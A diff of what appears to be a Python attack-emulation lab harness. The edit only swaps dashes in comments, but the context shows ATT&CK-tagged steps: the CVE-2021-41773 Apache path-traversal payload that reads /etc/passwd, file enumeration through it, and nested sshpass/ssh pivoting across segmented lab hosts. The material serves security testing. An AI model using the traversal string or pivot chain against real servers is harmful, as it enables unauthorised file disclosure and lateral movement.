@@ -265,7 +265,7 @@ def _t1059_004_exec_on_target2(fleet: HostFleet, tid: str,
     target2_user, target2_password = _ssh_credential(fleet, "target2")
     # SCP preserves mode in theory but the lab user's umask + ssh server
     # config sometimes drop the execute bit. Use `sh` to run the script
-    # rather than relying on the +x bit — this also documents the choice
+    # rather than relying on the +x bit - this also documents the choice
     # in the manifest evidence.
     result = fleet.run_shell_on(
         "target1",
@@ -287,7 +287,7 @@ def _t1059_004_exec_on_target2(fleet: HostFleet, tid: str,
 
 
 # ----------------------------------------------------------------------
-# CVE-2021-41773 — Apache 2.4.49 path traversal exploitation
+# CVE-2021-41773 - Apache 2.4.49 path traversal exploitation
 # ----------------------------------------------------------------------
 
 # Canonical exploitation URL pattern from the Apache Security advisory.
@@ -298,7 +298,7 @@ _CVE_2021_41773_PATH = "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
 
 def _t1595_002_probe_apache_version(fleet: HostFleet, tid: str,
                                        run_dir: Path) -> TechniqueOutcome:
-    """T1595.002 — confirm the target speaks Apache 2.4.49 via Server header."""
+    """T1595.002 - confirm the target speaks Apache 2.4.49 via Server header."""
     start = _now()
     result = fleet.run_shell_on(
         "attacker",
@@ -310,7 +310,7 @@ def _t1595_002_probe_apache_version(fleet: HostFleet, tid: str,
     if result.ok and "Apache/2.4.49" in (result.stdout + result.stderr):
         return _outcome_success(
             tid, ["techniques/T1595.002_version_probe.log"],
-            "Server header confirms Apache/2.4.49 — the exact vulnerable build",
+            "Server header confirms Apache/2.4.49 - the exact vulnerable build",
             _now() - start,
             realization=Realization.generic_primitive,
         )
@@ -324,7 +324,7 @@ def _t1595_002_probe_apache_version(fleet: HostFleet, tid: str,
 
 def _t1190_exploit_cve_2021_41773(fleet: HostFleet, tid: str,
                                      run_dir: Path) -> TechniqueOutcome:
-    """T1190 — fire the canonical CVE-2021-41773 path-traversal request and
+    """T1190 - fire the canonical CVE-2021-41773 path-traversal request and
     confirm /etc/passwd contents are exfiltrated in the response body."""
     start = _now()
     result = fleet.run_shell_on(
@@ -358,7 +358,7 @@ def _t1190_exploit_cve_2021_41773(fleet: HostFleet, tid: str,
 
 def _t1083_enumerate_via_traversal(fleet: HostFleet, tid: str,
                                       run_dir: Path) -> TechniqueOutcome:
-    """T1083 — re-use the traversal to enumerate other sensitive paths
+    """T1083 - re-use the traversal to enumerate other sensitive paths
     (/etc/hostname, /etc/issue, /etc/group). Documents the scope of the
     initial-access pivot."""
     start = _now()
@@ -397,7 +397,7 @@ def _t1083_enumerate_via_traversal(fleet: HostFleet, tid: str,
 
 def _t1005_exfil_passwd_to_attacker_disk(fleet: HostFleet, tid: str,
                                             run_dir: Path) -> TechniqueOutcome:
-    """T1005 — persist the previously-leaked /etc/passwd as a collection
+    """T1005 - persist the previously-leaked /etc/passwd as a collection
     artifact on the attacker filesystem."""
     start = _now()
     result = fleet.run_shell_on(
@@ -566,7 +566,7 @@ def _ssh_pivot_command(jump_chain: list[str], final_command: str) -> str:
     (it only intercepts the first prompt of one ssh call). Instead we
     nest ``ssh`` invocations so each hop runs its own ``sshpass`` against
     the next hop's listening sshd. This requires ``sshpass`` to be
-    present on every intermediate host — which is true here because the
+    present on every intermediate host - which is true here because the
     ``autosut/dmz-host:s28`` baked image installs it.
 
     ``jump_chain[-1]`` is the host where ``final_command`` runs;
@@ -593,7 +593,7 @@ def _ssh_pivot_command(jump_chain: list[str], final_command: str) -> str:
         # Each wrap adds an outer layer of ssh. The inner command becomes
         # the remote command on `host`.
         command = ssh_wrap(host, command)
-    # Final outer call — from the attacker, ssh to the first hop. The
+    # Final outer call - from the attacker, ssh to the first hop. The
     # inner command is the entire nested chain above.
     first_hop = chain_reversed[-1]
     return (f"sshpass -p '{_LAB_PASSWORD}' ssh {opts} "
@@ -602,7 +602,7 @@ def _ssh_pivot_command(jump_chain: list[str], final_command: str) -> str:
 
 def _t1018_topology_attacker_reaches_nginx(fleet: HostFleet, tid: str,
                                               run_dir: Path) -> TechniqueOutcome:
-    """T1018 — confirm the attacker has L2 reachability to nginx."""
+    """T1018 - confirm the attacker has L2 reachability to nginx."""
     start = _now()
     result = fleet.run_shell_on(
         "attacker",
@@ -614,7 +614,7 @@ def _t1018_topology_attacker_reaches_nginx(fleet: HostFleet, tid: str,
     if "open" in output_text or "succeeded" in output_text:
         return _outcome_success(
             tid, ["techniques/T1018_attacker_to_nginx.log"],
-            "Attacker (internet_edge zone) reached nginx:22 — both hosts "
+            "Attacker (internet_edge zone) reached nginx:22 - both hosts "
             "share the internet_edge Docker network",
             _now() - start,
         )
@@ -628,7 +628,7 @@ def _t1018_topology_attacker_reaches_nginx(fleet: HostFleet, tid: str,
 
 def _t1135_topology_attacker_cannot_reach_db(fleet: HostFleet, tid: str,
                                                 run_dir: Path) -> TechniqueOutcome:
-    """T1135 — confirm the attacker has NO L2 path to db.
+    """T1135 - confirm the attacker has NO L2 path to db.
 
     This is the topology-enforcement claim: we declared segmentation
     (attacker in internet_edge only, db in enterprise only). Docker
@@ -652,7 +652,7 @@ def _t1135_topology_attacker_cannot_reach_db(fleet: HostFleet, tid: str,
         return _outcome_success(
             tid, ["techniques/T1135_attacker_to_db_blocked.log"],
             "Attacker (internet_edge) was blocked from db (enterprise) at "
-            "L2 — Docker zone segmentation held. Output preserved for audit.",
+            "L2 - Docker zone segmentation held. Output preserved for audit.",
             _now() - start,
         )
     return _outcome_failure(
@@ -666,7 +666,7 @@ def _t1135_topology_attacker_cannot_reach_db(fleet: HostFleet, tid: str,
 
 def _t1021_topology_pivot_nginx_to_app_server(fleet: HostFleet, tid: str,
                                                   run_dir: Path) -> TechniqueOutcome:
-    """T1021.004 — from the attacker, pivot SSH through nginx to app_server.
+    """T1021.004 - from the attacker, pivot SSH through nginx to app_server.
 
     Demonstrates that the attacker cannot reach app_server directly (it's
     not in internet_edge) but CAN reach it via nginx (which is in dmz).
@@ -696,7 +696,7 @@ def _t1021_topology_pivot_nginx_to_app_server(fleet: HostFleet, tid: str,
 
 def _t1210_topology_pivot_app_server_to_db(fleet: HostFleet, tid: str,
                                               run_dir: Path) -> TechniqueOutcome:
-    """T1210 — from the attacker, pivot through nginx and app_server to
+    """T1210 - from the attacker, pivot through nginx and app_server to
     reach db (the enterprise-only host)."""
     start = _now()
     pivot_cmd = _ssh_pivot_command(["nginx", "app_server", "db"],
